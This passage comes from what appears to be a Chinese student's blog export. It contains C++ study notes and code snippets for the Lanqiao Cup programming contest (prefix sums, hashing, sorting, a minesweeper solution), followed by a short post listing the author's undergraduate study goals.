<span class="type">int</span> k = a % b;</span><br><span class="line">        a = b;</span><br><span class="line">        b = k;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;b: &quot;</span> &lt;&lt; b&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">fun1</span>(a,b) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="前缀和"><a href="#前缀和" class="headerlink" title="前缀和"></a>前缀和</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">505</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">int</span> s[N][N];</span><br><span class="line">LL result = <span class="number">0</span>, k;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;k);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s[i][j]);</span><br><span class="line">			s[i][j] += s[i - <span class="number">1</span>][j] + s[i][j - <span class="number">1</span>] -s[i- <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> x1 = <span class="number">1</span>; x1 &lt;= n; x1++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> y1 = <span class="number">1</span>; y1 &lt;= m; y1++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> x2 = x1; x2 &lt;= n; x2++) &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> y2 = y1; y2 &lt;= m; y2++) &#123;</span><br><span class="line">					sum = s[x2][y2] - s[x1 - <span class="number">1</span>][y2] </span><br><span class="line">						- s[x2][y1 - <span class="number">1</span>]	+ s[x1 - <span class="number">1</span>][y1 - <span class="number">1</span>];</span><br><span class="line">					<span class="keyword">if</span> (sum &lt;= k) result++;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, result);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="存储单位的换算"><a href="#存储单位的换算" class="headerlink" title="存储单位的换算"></a>存储单位的换算</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>MB=<span class="number">1024</span>KB</span><br><span class="line"><span class="number">1</span>KB=<span class="number">1024B</span></span><br><span class="line"><span class="number">1B</span>=<span class="number">8b</span>;</span><br><span class="line">B:byte字节</span><br><span class="line">b:bit比特(<span class="number">1</span>位=<span class="number">1</span>比特)</span><br><span class="line"><span class="number">32</span>位=<span class="number">4B</span></span><br><span class="line">题解的意思是有多少个<span class="number">32</span>位</span><br><span class="line">转化成<span class="type">long</span> <span class="type">long</span>避免数据溢出</span><br></pre></td></tr></table></figure>

<ul>
<li>bit(比特)：bit是数据的最小单位，通常简写为b。在计算机中通常用1和0来表示。</li>
<li>Byte(字节)：数据存储的基本单位，通常简写为B。通常：1Byte&#x3D;8bit。</li>
</ul>
<h3 id="优先队列"><a href="#优先队列" class="headerlink" title="优先队列"></a>优先队列</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">priority_queue, 优先队列，默认是大根堆</span><br><span class="line">    <span class="built_in">size</span>()</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">push</span>()  插入一个元素</span><br><span class="line">    <span class="built_in">top</span>()  返回堆顶元素</span><br><span class="line">    <span class="built_in">pop</span>()  弹出堆顶元素</span><br><span class="line">    定义成小根堆的方式：priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; q;</span><br></pre></td></tr></table></figure>
<h3 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h3><h3 id="判断一个数是否为素数"><a href="#判断一个数是否为素数" class="headerlink" title="判断一个数是否为素数"></a>判断一个数是否为素数</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断一个数是否为质数 </span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">judge</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i * i &lt;= x; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (x % i == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">judge</span>(i)) cout &lt;&lt; i &lt;&lt; endl; </span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="是否为闰年"><a href="#是否为闰年" class="headerlink" title="是否为闰年"></a>是否为闰年</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">leapYear</span><span class="params">(<span class="type">int</span> year)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span> || year % <span class="number">400</span> == <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1900</span>; i &lt;= <span class="number">2000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">judge</span>(i)) cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="手写日历"><a href="#手写日历" class="headerlink" title="手写日历"></a>手写日历</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">getDate</span><span class="params">(<span class="type">int</span> yy)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> y = <span class="number">2020</span>; y &lt;= yy; y++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isRun</span>(y)) month[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line">        <span class="keyword">else</span> month[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">1</span>; m &lt;= <span class="number">12</span>; m++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> d = <span class="number">1</span>; d &lt;= month[m]; d++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d:%d:%d\n&quot;</span>, y, m, d);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="手写哈希-开放地址寻址法"><a href="#手写哈希-开放地址寻址法" class="headerlink" title="手写哈希-开放地址寻址法"></a>手写哈希-开放地址寻址法</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e5</span>+<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">LL hash[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(LL x)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> key = (x % N + N) % N; <span class="comment">// 这么做是为了防止出现取模后值为负数的情况</span></span><br><span class="line">	<span class="keyword">while</span> (hash[key] != <span class="number">0</span> &amp;&amp; hash[key] != x) &#123;</span><br><span class="line">		key++;</span><br><span class="line">		<span class="keyword">if</span> (key == N) key = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">100</span>; j++) &#123;</span><br><span class="line">			LL number = i*j + j / i;</span><br><span class="line">			hash[<span class="built_in">find</span>(number)] = number;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// find number wherever in the array </span></span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	cin &gt;&gt; num;</span><br><span class="line">	string flag = hash[<span class="built_in">find</span>(num)] == <span class="number">0</span>? <span class="string">&quot;no&quot;</span>:<span class="string">&quot;yes&quot;</span>; </span><br><span class="line">	cout &lt;&lt; flag&lt;&lt;endl;;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;hello world&quot;</span>&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="回溯算法"><a href="#回溯算法" class="headerlink" title="回溯算法"></a>回溯算法</h3><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><h3 id="精度转换"><a href="#精度转换" class="headerlink" title="精度转换"></a>精度转换</h3><h3 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h3><h3 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h3><h3 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h3><h3 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  vector&lt;<span class="type">char</span>&gt; chars = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    cout &lt;&lt; chars[<span class="number">0</span>] &lt;&lt; chars[<span class="number">1</span>] &lt;&lt; chars[<span class="number">2</span>] &lt;&lt; endl;</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="built_in">next_permutation</span>(chars.<span class="built_in">begin</span>(), chars.<span class="built_in">end</span>()));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 方式一、使用数组</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sort</span>(a, a + <span class="number">10</span>);  <span class="comment">// 10为元素个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) cout &lt;&lt; a[i] &lt;&lt; <span class="string">&#x27; &#x27;</span>;		<span class="comment">// 输出排序后数组</span></span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方式二、使用 vector</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; arr = &#123;<span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>());  <span class="comment">// 10为元素个数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&#x27; &#x27;</span>;	<span class="comment">// 输出排序后数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="时间限制的估计"><a href="#时间限制的估计" class="headerlink" title="时间限制的估计"></a>时间限制的估计</h3><p>1000ms意味着<br>一般来说你的程序计算次数达到1e8就很容易超时<br><img src="https://cdn.nlark.com/yuque/__latex/50774a3b265cb90b26751bbcc84d74d3.svg#card=math&code=O%28n%5E3%29%0A&id=XL8CG">的算法，  n可以几百，一般题目给的数据范围为100，<br><img src="https://cdn.nlark.com/yuque/__latex/f2d5f588234eb61a559ff90c41511b85.svg#card=math&code=O%28n%5E2%29&id=ryayx"> 的算法， 可以几千，经常出现的就是数据范围1000。<br><img src="https://cdn.nlark.com/yuque/__latex/d87469bfa5b4ac8a4c2970ca5cf5700e.svg#card=math&code=O%28n%29%20%E6%88%96%E8%80%85O%28nlogn%29&id=y4ZoT">的算法，最常见的数据范围就是为100000。</p>
<h3 id="时间优化"><a href="#时间优化" class="headerlink" title="时间优化"></a>时间优化</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> m=n*<span class="number">2</span>  可改为   m=n&lt;&lt;<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> m=n/<span class="number">16</span> 可改为   m=n&gt;&gt;<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> m=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">while</span>(m%<span class="number">2</span>==<span class="number">1</span>)  可改为  <span class="keyword">while</span>(m&amp;<span class="number">1</span>)  <span class="comment">//若m为奇数则m&amp;1=1,若为偶数则等于0；</span></span><br></pre></td></tr></table></figure>
<h3 id="字符类型转换"><a href="#字符类型转换" class="headerlink" title="字符类型转换"></a>字符类型转换</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数值型 转 string</span></span><br><span class="line">string s = <span class="built_in">to_string</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//string 转 int型</span></span><br><span class="line"><span class="type">int</span> n = <span class="built_in">atoi</span>(str.<span class="built_in">c_str</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//char* 转 int型</span></span><br><span class="line"><span class="type">int</span> n = <span class="built_in">atoi</span>(ch);</span><br><span class="line"></span><br><span class="line"><span class="comment">//string 转 char*</span></span><br><span class="line">string str = <span class="string">&quot;it&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* cstr = str.<span class="built_in">c_str</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//char* 转 string </span></span><br><span class="line"><span class="type">char</span>* s = <span class="string">&quot;it&quot;</span>;</span><br><span class="line"><span class="function">string <span class="title">str</span><span class="params">(s)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="string的常用操作"><a href="#string的常用操作" class="headerlink" title="string的常用操作"></a>string的常用操作</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回由pos开始的n个字符组成的字符串</span></span><br><span class="line"><span class="function">string <span class="title">substr</span><span class="params">(<span class="type">int</span> pos = <span class="number">0</span>, <span class="type">int</span> n = npos)</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找str第一次出现位置,从pos开始查找</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">const</span> string&amp; str, <span class="type">int</span> pos = <span class="number">0</span>)</span> <span class="type">const</span></span>; </span><br><span class="line"></span><br><span class="line">string，字符串</span><br><span class="line">    <span class="built_in">size</span>()/<span class="built_in">length</span>()  返回字符串长度</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">clear</span>()</span><br><span class="line">    <span class="built_in">substr</span>(起始下标，(子串长度))  返回子串</span><br><span class="line">    <span class="built_in">c_str</span>()  返回字符串所在字符数组的起始地址</span><br></pre></td></tr></table></figure>
<h3 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h3><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">buble</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i ++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (a[j + <span class="number">1</span>] &lt; a[j]) &#123;</span><br><span class="line">				<span class="built_in">swap</span>(a[j + <span class="number">1</span>], a[j]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><h3 id="数组模拟链表"><a href="#数组模拟链表" class="headerlink" title="数组模拟链表"></a>数组模拟链表</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示当前用到了哪个节点</span></span><br><span class="line"><span class="type">int</span> head, e[N], ne[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    head = <span class="number">-1</span>;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在链表头插入一个数a</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = a, ne[idx] = head, head = idx ++ ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将头结点删除，需要保证头结点存在</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    head = ne[head];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><ol>
<li>C语言中局部变量数组最大只支持1M,而<strong>全局变量数组没有这个限制</strong>！</li>
<li>int（long） 的取值范围： [2 ^ 31 - 1,  2 ^ 31]</li>
<li>long long 的取值范围：[2 ^ 63 - 1, 2 ^ 63]</li>
<li>最好不要用memset来初始化</li>
<li>在做填空题的时候要小心，看是否包含当前的数，避免答案与正确答案之间相差1</li>
<li>在图论问题中，如果有多个点，要判断 点会重合的情况</li>
<li>memset函数是按照字节对内存块进行初始化，所以不能用它将int数组出初始化为0和-1之外的其他值（除非该值高字节和低字节相同）。</li>
</ol>
<h2 id="真题"><a href="#真题" class="headerlink" title="真题"></a>真题</h2><h3 id="扫雷"><a href="#扫雷" class="headerlink" title="扫雷"></a>扫雷</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> BASE = <span class="number">1e9</span> + <span class="number">1</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX = <span class="number">999997</span>;</span><br><span class="line"></span><br><span class="line">LL hash1[MAX];</span><br><span class="line"><span class="type">int</span> number[MAX], rMax[MAX], visited[MAX];</span><br><span class="line"><span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将二维数据压缩成一维 </span></span><br><span class="line"><span class="function">LL <span class="title">to_base</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (LL)x * BASE + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 手写哈希表-开放地址法 </span></span><br><span class="line"><span class="function">LL <span class="title">find</span><span class="params">(LL x)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> key = (x % MAX + MAX) % MAX;</span><br><span class="line">	<span class="keyword">while</span> (hash1[key] != <span class="number">-1</span> &amp;&amp; hash1[key] != x) &#123;</span><br><span class="line">		key++;</span><br><span class="line">		<span class="keyword">if</span> (key == MAX) key = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断点是否在圆内 </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">judge</span><span class="params">(<span class="type">int</span> x1, <span class="type">int</span> y1, <span class="type">int</span> x2, <span class="type">int</span> y2, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">pow</span>(x1 - x2, <span class="number">2</span>) + <span class="built_in">pow</span>(y1 - y2, <span class="number">2</span>) &lt;= r * r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 深度搜索 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = x - r; i &lt;= x + r; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = y - r; j &lt;= y + r; j++) &#123;</span><br><span class="line">			LL base = <span class="built_in">to_base</span>(i, j);</span><br><span class="line">			<span class="keyword">if</span> (number[<span class="built_in">find</span>(base)] &amp;&amp; <span class="built_in">judge</span>(x, y, i, j, r) &amp;&amp; !visited[<span class="built_in">find</span>(base)])&#123;</span><br><span class="line">				result += number[<span class="built_in">find</span>(base)];</span><br><span class="line">				visited[<span class="built_in">find</span>(base)] = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">dfs</span>(i, j, rMax[<span class="built_in">find</span>(base)]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	<span class="built_in">memset</span>(hash1, <span class="number">-1</span>, <span class="built_in">sizeof</span>(hash1));</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="type">int</span> x, y, r;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;x, &amp;y, &amp;r);</span><br><span class="line">		LL base = <span class="built_in">to_base</span>(x, y);</span><br><span class="line">		hash1[<span class="built_in">find</span>(base)] = base;</span><br><span class="line">		number[<span class="built_in">find</span>(base)]++;</span><br><span class="line">		rMax[<span class="built_in">find</span>(base)] = <span class="built_in">max</span>(r, rMax[<span class="built_in">find</span>(base)]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">		<span class="type">int</span> x, y, r;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;x, &amp;y, &amp;r);</span><br><span class="line">		<span class="built_in">dfs</span>(x, y, r);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, result);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程技能</category>
      </categories>
      <tags>
        <tag>蓝桥杯</tag>
      </tags>
  </entry>
  <entry>
    <title>大学本科的目标</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E5%A4%A7%E5%AD%A6%E6%9C%AC%E7%A7%91%E7%9A%84%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="大学本科阶段的总结"><a href="#大学本科阶段的总结" class="headerlink" title="大学本科阶段的总结"></a>大学本科阶段的总结</h2><h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ol>
<li>达到考研水平</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li><p>学完408</p>
</li>
<li></li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>达到考研英语水平</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>能达到去公司实习的水平</li>
<li>做一个属于自己的个人博客</li>
<li></li>
</ol>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><ol>
<li>发表一篇sci独立一作</li>
</ol>
<h3 id="竞赛"><a href="#竞赛" class="headerlink" title="竞赛"></a>竞赛</h3><ol>
<li>算法竞赛</li>
<li>打进国赛</li>
<li>数学建模<ol>
<li>国赛拿奖</li>
</ol>
</li>
</ol>
